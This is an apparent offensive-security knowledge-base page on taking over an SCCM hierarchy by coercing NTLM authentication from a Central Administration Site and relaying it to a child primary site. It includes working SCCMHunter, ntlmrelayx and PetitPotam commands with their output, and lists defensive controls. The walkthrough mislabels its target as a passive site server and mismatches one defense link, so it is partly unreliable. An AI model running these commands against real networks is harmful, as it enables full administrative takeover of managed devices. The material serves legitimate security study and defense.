# TAKEOVER-4

## Description
Hierarchy takeover via NTLM coercion and relay from CAS to origin primary site server

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
-
-

## Summary
In some situations, such as reaching limits for [client enrollment](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/configs/size-and-scale-numbers#bkmk_pri), SCCM adminsitrators may choose to expand from single site into a hierarchy mangaed by a Central Administration Site (CAS). A prerequisite for expansion is for the CAS's host server machine account to be a [local administrator](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites#computer-account-as-administrator) on the originating primary site server. This permission is only required during expansion of the site and can be removed when complete. Additionally, this permission is not required for any further sites joined to the hierarchy once complete. However, if a configuration exists where all site server hosts are a member of a security group that grants local administrator rights to each other, the CAS can be coerced and relayed to *any* child site.

An attacker who is able to successfully coerce NTLM authentication from a CAS via SMB can escalate to "Full Administrator" by either: 
1. Relaying the CAS to SMB on its originating child primary site
2. Relaying the CAS to the AdminService on its originating child primary site

## Impact

The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Subtechniques
- TAKEOVER-4.1: Relay to SMB
- TAKEOVER-4.2: Relay to AdminService

## Defensive IDs
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-2/prevent-2_description.md)
- [DETECT-1: Monitor site system computer accounts authenticating from a source that is not its static IP](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [DETECT-4: Monitor group membership changes for SMS Admins](../../../defense-techniques/DETECT/DETECT-4/detect-4_description.md)

## Examples

### SMB relay

1. Use `SCCMHunter` to profile SCCM infrastructure

The results of the `smb` module indicate:
- The *CAS.INTERNAL.LAB* sytems is a site server in the "CAS" site and is also a Central Administration Site
- The *SCCM2.INTERNAL.LAB* host is a site server in the "ABC" site
- SMB signing is disabled on both systems
 

```
└─# python3 sccmhunter.py smb -u 'lowpriv' -p '<password>' -d <domain.name> -dc-ip 10.10.100.100
SCCMHunter v1.0.0 by @garrfoster
[16:23:53] INFO     Profiling 2 site servers.
[16:23:53] INFO     [+] Finished profiling Site Servers.
[16:23:53] INFO     +----------------------+------------+-------+-----------------+--------------+---------------+----------+---------+
                    | Hostname             | SiteCode   | CAS   | SigningStatus   | SiteServer   | SMSProvider   | Config   | MSSQL   |
                    +======================+============+=======+=================+==============+===============+==========+=========+
                    | cas.internal.lab     | CAS        | True  | False           | True         | True          | Active   | True    |
                    +----------------------+------------+-------+-----------------+--------------+---------------+----------+---------+
                    | sccm2.internal.lab   | ABC        | False | False           | True         | True          | Active   | True    |
                    +----------------------+------------+-------+-----------------+--------------+---------------+----------+---------+
```

2. On the attacker relay server, start `ntlmrelayx`, targeting the SMB service on the primary site server identified in the previous step.  The `-socks` flag is used to hold the authenticated session open

```
└─# python3 ntlmrelayx.py -t smb://TARGET_SITE_SERVER -smb2support -socks
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

3. From the attacker host, coerce NTLM authentication from the CAS via SMB, targeting the relay server's IP address:

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <PASSIVE_SITE_SERVER_IP> 

Trying pipe lsarpc
[-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the SMB service on the site server and the authenticated session is held open

```
Type help for list of commands
ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.141, attacking target smb://10.10.100.121
[*] Authenticating against smb://10.10.100.121 as LAB/PASSIVE$ SUCCEED
[*] SOCKS: Adding LAB/PASSIVE$@10.10.100.121(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.141 controlled, but there are no more targets left!
[*] SOCKS: Proxying client session for LAB/PASSIVE$@10.10.100.121(445)
```



## References
Author, Title, URL

Microsoft, Prerequisites for installing Configuration Manager sites, https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites#bkmk_expand